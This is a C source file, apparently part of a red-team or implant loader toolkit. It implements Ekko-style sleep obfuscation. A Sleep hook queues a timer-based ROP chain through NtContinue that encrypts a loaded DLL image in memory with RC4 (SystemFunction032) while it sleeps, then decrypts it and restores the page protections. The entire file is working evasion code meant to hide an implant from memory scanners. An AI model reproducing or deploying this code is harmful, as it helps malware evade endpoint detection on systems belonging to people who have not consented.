#include <windows.h>
#include "tcg.h"

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#define NtCurrentProcess()  ((HANDLE)(LONG_PTR)-1)

/* ── Win32 imports (Crystal Palace MODULE$Function convention) ── */
DECLSPEC_IMPORT DWORD   KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT HANDLE  KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
DECLSPEC_IMPORT HANDLE  KERNEL32$CreateTimerQueue(VOID);
DECLSPEC_IMPORT BOOL    KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
DECLSPEC_IMPORT BOOL    KERNEL32$DeleteTimerQueue(HANDLE);
DECLSPEC_IMPORT BOOL    KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL    KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT HMODULE KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT HMODULE KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    KERNEL32$FlushInstructionCache(HANDLE, LPCVOID, SIZE_T);
DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char *, ...);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);

// MessageBoxA is used in the hooks to demonstrate that the hooks are working, and to show the output of the GetVersions callback
// DECLSPEC_IMPORT int WINAPI USER32$MessageBoxA ( HWND, LPCSTR, LPCSTR, UINT );

/* ── USTRING for SystemFunction032 (RC4-based XOR encrypt/decrypt) ── */
typedef struct {
    DWORD  Length;
    DWORD  MaximumLength;
    PVOID  Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *fnSystemFunction032)(USTRING *, USTRING *);
typedef VOID     (WINAPI *fnRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS (NTAPI  *fnNtContinue)(PCONTEXT, BOOLEAN);

/* ── Globals set by setup_hooks — stores the loaded DLL image info ── */
PVOID  g_ImageBase = NULL;
DWORD  g_ImageSize = 0;

/*
 * restore_section_permissions — walks the PE section table at g_ImageBase
 * and applies correct per-section page protections, then sets the PE header
 * as PAGE_READONLY. Called after Ekko decrypts the image to restore proper
 * permissions instead of a blanket PAGE_EXECUTE_READWRITE.
 */
static void restore_section_permissions(void)
{
    char * base = (char *)g_ImageBase;

    IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS * nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    DWORD section_count = nt->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * sec = (IMAGE_SECTION_HEADER *)
        ((char *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    DWORD old_prot = 0;

    for (DWORD i = 0; i < section_count; i++, sec++) {
        void  *addr = base + sec->VirtualAddress;
        DWORD  size = sec->Misc.VirtualSize;
        if (size == 0)
            size = sec->SizeOfRawData;

        DWORD prot = 0;
        DWORD c    = sec->Characteristics;

        if (c & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        if (c & IMAGE_SCN_MEM_READ)
            prot = PAGE_READONLY;
        if ((c & IMAGE_SCN_MEM_READ) && (c & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_READWRITE;
        if (c & IMAGE_SCN_MEM_EXECUTE)
            prot = PAGE_EXECUTE;
        if ((c & IMAGE_SCN_MEM_EXECUTE) && (c & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_EXECUTE_READWRITE;
        if ((c & IMAGE_SCN_MEM_EXECUTE) && (c & IMAGE_SCN_MEM_READ))
            prot = PAGE_EXECUTE_READ;
        if ((c & IMAGE_SCN_MEM_READ) && (c & IMAGE_SCN_MEM_WRITE) && (c & IMAGE_SCN_MEM_EXECUTE))
            prot = PAGE_EXECUTE_READWRITE;

        if (prot != 0 && size > 0)
            KERNEL32$VirtualProtect(addr, size, prot, &old_prot);
    }

    /* PE header → read-only */
    KERNEL32$VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_prot);
    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base, g_ImageSize);

}

/*
 * EkkoObf — Ekko-style sleep obfuscation via timer queue ROP chain
 *
 * 1. VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE)
 * 2. SystemFunction032(Image, Key)  — RC4 encrypt in-place
 * 3. WaitForSingleObject(CurrentProcess, SleepTime)  — actual sleep
 * 4. SystemFunction032(Image, Key)  — RC4 decrypt
 * 5. restore_section_permissions()  — fix per-section protections
 * 6. SetEvent(hEvent)  — signal completion
 *
 * Each step is a CONTEXT struct dispatched via NtContinue from a timer queue.
 */
VOID EkkoObf(DWORD SleepTime)
{
    CONTEXT CtxThread;
    CONTEXT RopProtRW;
    CONTEXT RopMemEnc;
    CONTEXT RopDelay;
    CONTEXT RopMemDec;
    CONTEXT RopFixSec;
    CONTEXT RopSetEvt;

    MSVCRT$memset(&CtxThread, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopProtRW, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopMemEnc, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopDelay,  0, sizeof(CONTEXT));
    MSVCRT$memset(&RopMemDec, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopFixSec, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopSetEvt, 0, sizeof(CONTEXT));

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    DWORD   OldProtect  = 0;

    /* RC4 key — can be randomised per-sleep */
    CHAR    KeyBuf[16];
    MSVCRT$memset(KeyBuf, 0x55, 16);
    USTRING Key;
    USTRING Img;
    MSVCRT$memset(&Key, 0, sizeof(USTRING));
    MSVCRT$memset(&Img, 0, sizeof(USTRING));

    if (!g_ImageBase || !g_ImageSize) {
        MSVCRT$printf("[ekko] ERROR: image base/size not set, falling back to plain wait\n");
        KERNEL32$WaitForSingleObject(NtCurrentProcess(), SleepTime);
        return;
    }

    /* resolve NtContinue, RtlCaptureContext, SystemFunction032 */
    HMODULE hNtdll   = KERNEL32$GetModuleHandleA("ntdll");
    HMODULE hAdvapi  = KERNEL32$LoadLibraryA("Advapi32");

    if (!hNtdll || !hAdvapi) {
        MSVCRT$printf("[ekko] ERROR: failed to load ntdll/advapi32\n");
        KERNEL32$WaitForSingleObject(NtCurrentProcess(), SleepTime);
        return;
    }

    fnNtContinue        pNtContinue        = (fnNtContinue)       KERNEL32$GetProcAddress(hNtdll,  "NtContinue");
    fnRtlCaptureContext pRtlCaptureContext  = (fnRtlCaptureContext)KERNEL32$GetProcAddress(hNtdll,  "RtlCaptureContext");
    fnSystemFunction032 pSysFunc032         = (fnSystemFunction032)KERNEL32$GetProcAddress(hAdvapi, "SystemFunction032");

    if (!pNtContinue || !pRtlCaptureContext || !pSysFunc032) {
        MSVCRT$printf("[ekko] ERROR: failed to resolve functions\n");
        KERNEL32$WaitForSingleObject(NtCurrentProcess(), SleepTime);
        return;
    }

    MSVCRT$printf("[ekko] ImageBase=%p Size=0x%lx SleepTime=%lu ms\n", g_ImageBase, g_ImageSize, SleepTime);

    /* setup USTRING for SystemFunction032 */
    Key.Buffer = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    Img.Buffer = g_ImageBase;
    Img.Length  = Img.MaximumLength = g_ImageSize;

    hEvent      = KERNEL32$CreateEventW(0, 0, 0, 0);
    hTimerQueue = KERNEL32$CreateTimerQueue();

    if (!hEvent || !hTimerQueue) {
        MSVCRT$printf("[ekko] ERROR: failed to create event/timer queue\n");
        KERNEL32$WaitForSingleObject(NtCurrentProcess(), SleepTime);
        return;
    }

    /* step 0: capture the current thread context via a timer callback */
    if (KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)pRtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
    {
        KERNEL32$WaitForSingleObject(hEvent, 0x32); /* brief wait for context capture */

        /* clone captured context into each ROP frame */
        MSVCRT$memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        MSVCRT$memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
        MSVCRT$memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
        MSVCRT$memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
        MSVCRT$memcpy(&RopFixSec, &CtxThread, sizeof(CONTEXT));
        MSVCRT$memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

        /* ── ROP 1: VirtualProtect → PAGE_READWRITE ── */
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip  = (DWORD64)KERNEL32$VirtualProtect;
        RopProtRW.Rcx  = (DWORD64)g_ImageBase;
        RopProtRW.Rdx  = (DWORD64)g_ImageSize;
        RopProtRW.R8   = PAGE_READWRITE;
        RopProtRW.R9   = (DWORD64)&OldProtect;

        /* ── ROP 2: SystemFunction032 → encrypt ── */
        RopMemEnc.Rsp -= 8;
        RopMemEnc.Rip  = (DWORD64)pSysFunc032;
        RopMemEnc.Rcx  = (DWORD64)&Img;
        RopMemEnc.Rdx  = (DWORD64)&Key;

        /* ── ROP 3: WaitForSingleObject → sleep ── */
        RopDelay.Rsp  -= 8;
        RopDelay.Rip   = (DWORD64)KERNEL32$WaitForSingleObject;
        RopDelay.Rcx   = (DWORD64)NtCurrentProcess();
        RopDelay.Rdx   = (DWORD64)SleepTime;

        /* ── ROP 4: SystemFunction032 → decrypt ── */
        RopMemDec.Rsp -= 8;
        RopMemDec.Rip  = (DWORD64)pSysFunc032;
        RopMemDec.Rcx  = (DWORD64)&Img;
        RopMemDec.Rdx  = (DWORD64)&Key;

        /* ── ROP 5: restore_section_permissions → fix per-section protections ── */
        RopFixSec.Rsp -= 8;
        RopFixSec.Rip  = (DWORD64)restore_section_permissions;

        /* ── ROP 6: SetEvent → signal done ── */
        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip  = (DWORD64)KERNEL32$SetEvent;
        RopSetEvt.Rcx  = (DWORD64)hEvent;

        MSVCRT$printf("[ekko] queuing ROP chain timers...\n");

        /* queue each context frame via NtContinue, staggered 100ms apart */
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopFixSec, 500, 0, WT_EXECUTEINTIMERTHREAD);
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

        MSVCRT$printf("[ekko] waiting for obfuscation chain to complete...\n");

        /* block until the ROP chain signals completion */
        KERNEL32$WaitForSingleObject(hEvent, INFINITE);

        MSVCRT$printf("[ekko] sleep obfuscation complete, DLL decrypted and sections restored\n");
    }

    KERNEL32$DeleteTimerQueue(hTimerQueue);
}

/*
 * Sleep hook — Ekko sleep obfuscation
 * When the DLL calls Sleep(), we encrypt its memory, wait, then decrypt.
 */
VOID _Sleep(DWORD dwMilliseconds) {
    MSVCRT$printf("[hook] Sleep(%lu ms) -> Ekko sleep obfuscation\n", dwMilliseconds);
    
    EkkoObf(dwMilliseconds);
    
    // KERNEL32$WaitForSingleObject(NtCurrentProcess(), dwMilliseconds);
}
